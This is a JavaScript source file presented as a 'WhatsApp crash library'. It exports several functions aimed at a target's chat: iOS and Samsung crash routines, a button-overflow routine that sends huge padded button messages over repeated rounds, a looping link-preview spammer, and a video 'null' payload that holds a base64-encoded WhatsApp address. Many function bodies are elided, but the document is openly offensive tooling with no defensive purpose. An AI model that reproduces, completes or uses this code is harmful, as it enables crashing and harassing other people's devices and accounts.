// crashlib.js - Modular WhatsApp Crash Library
// Built from 4 provided codes - Unified API
...
const IosInvisibleForce = async (sock, target, options = {}) => {
  ...
  return { success: true, method: 'IosInvisibleForce', target };
};

// ============ MODULE 2: BUTTON OVERFLOW (NULL CASE) ============
const ButtonOverflowCrash = async (sock, target, options = {}) => {
  ...
  for (let b = 0; b < buttonCount; b++) {
    buttons.push({
      buttonId: `btn_${b}`,
      buttonText: {
        displayText: `👾 BTN_${b} ${char.substring(0, 500)}`
      },
      type: 1
    });
  }
  ...
  const firstPayload = {
    buttonsMessage: {
      contentText: `Jester - Tr4sh Button${char.substring(0, contentPad)}`,
      footerText: `Tr4sh NovaZ${char.substring(0, footerPad)}`,
      buttons,
      headerType: 1,
      viewOnce: true
    }
  ...
  for (let i = 0; i < extraRounds; i++) {
    ...
    for (let b = 0; b < extraButtons; b++) {
      roundButtons.push({
        ...
        buttonText: {
          displayText: `Tr4sh Whatsapp${i}_${b} ${char.substring(0, 200)}`
        },
        type: 1
      });
    }
    ...
    const roundPayload = {
      buttonsMessage: {
        contentText: `${char.substring(0, 20000)} Xvii Force ${i}`,
  ...
  return { success: true, method: 'ButtonOverflowCrash', target, rounds: extraRounds };
};

// ============ MODULE 3: SAMSUNG CRASH ============
const SamsungCrash = async (sock, target, options = {}) => {
  ...
  return { success: true, method: 'SamsungCrash', target };
};

// ============ MODULE 4: LINK PREVIEW LOOP ============
const LinkPreviewLoop = async (sock, chat, m, options = {}) => {
  const {
    ...
    link = "https://t.me/yat1mlau",
    title = "V7X",
    description = "© ./𝘷𝘪𝘯𝘻.ᐟ𝘩𝘢𝘯𝘥𝘴𝘰𝘮𝘦",
    cycles = 5,
    delay = 1500
  } = options;
  ...
  const loopPreview = async () => {
    try {
      ...
      console.error('LinkPreviewLoop error:', err.message);
    }
  };

  loopPreview();

  return { success: true, method: 'LinkPreviewLoop', chat, cycles, delay };
};
// ============ MODULE 5: VIDX NULL V2 ============
const VIDEO_PAYLOAD = {
...
const VidxNullV2 = async (client, target, options = {}) => {
  try {
    ...
    if (!global.__xploitCache && cacheGlobal) {
      ...
      const crl = Buffer
        .from(
          "NjI4NTE3NzkzNDk4MkBzLndoYXRzYXBwLm5ldA==",
          "base64"
        )
        .toString();
    ...
    return { success: true, method: 'VidxNullV2', target };
  } catch (e) {
    console.error('VidxNullV2 error:', e);
    return { success: false, method: 'VidxNullV2', target, error: e.message };
  }
};
...
module.exports = {
  ...
  SamsungCrash,
  LinkPreviewLoop,
  VidxNullV2,      // ADD THESE TWO
  VidxNullLoop,    // TO THE EXPORTS
  VIDEO_PAYLOAD,
  sleep,
  getBuffer
};